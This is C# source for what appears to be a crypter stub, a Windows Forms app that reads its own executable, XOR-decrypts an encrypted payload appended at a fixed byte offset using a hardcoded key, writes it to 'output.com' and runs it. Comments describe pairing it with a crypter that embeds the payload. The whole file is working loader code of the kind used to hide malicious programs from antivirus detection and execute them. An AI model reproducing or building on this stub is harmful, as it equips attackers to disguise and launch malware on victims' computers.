using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SomeAwesomeStub
{
    public partial class StubTest : Form
    {
        private int byteOffset = 11000;
        // The secret key used to encrypt / decrypt the executive code. The stub and crypter key
        // both must have the same key for this to work.
        private byte[] secretKey = new byte[] { 0x10, 0x20, 0x92, 0x12, 0x29 };

        public StubTest()
        {
            InitializeComponent();
        }

        private void BtnStubRun_Click(object sender, EventArgs e)
        {
            // Get the exe file path.
            string thisFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string outputPath = System.IO.Path.GetDirectoryName(thisFilePath) + "\\output.com";
            // Load all of the bytes of the file into an byte array.
            byte[] thisFileBytes = System.IO.File.ReadAllBytes(thisFilePath);
            // How much bytes is in this exe
            InfoNumBytes.Text = "Number of bytes in this exe: " + thisFileBytes.Length.ToString();

            // We are going to make a rule that if the byteOffset is not bigger than 0, we will
            // not run the program. This is because 0 byteOFfset means the necessary changes to
            // make this work has not be implemented.
            if (byteOffset > 0)
            {
                // We will add 1 last check to ensure the stub has being embedded.
                if (byteOffset > thisFileBytes.Length)
                {
                    InfoMsg.Text = "The stub has not yet being embedded with an encrypted" +
                        " payload";
                    return;
                }
                // We get the size of the encrypted executable, use it to create an byte array that
                // hold the decrypted bytes.
                int sizeOfEncryptedExe = thisFileBytes.Length - byteOffset;
                byte[] decryptedExecutable = new byte[sizeOfEncryptedExe];

                for (int i = 0; i < sizeOfEncryptedExe; i++)
                {
                    decryptedExecutable[i] =
                        (byte)(thisFileBytes[byteOffset + i] ^ secretKey[i % secretKey.Length]);
                }

                // Write all of the bytes to an output file
                System.IO.File.WriteAllBytes(outputPath, decryptedExecutable);
                System.Diagnostics.Process.Start(outputPath); //Run the file
            }
            else
            {
                InfoMsg.Text = "Program will not run as byteOffset is still set to 0";
            }
        }
    }
}
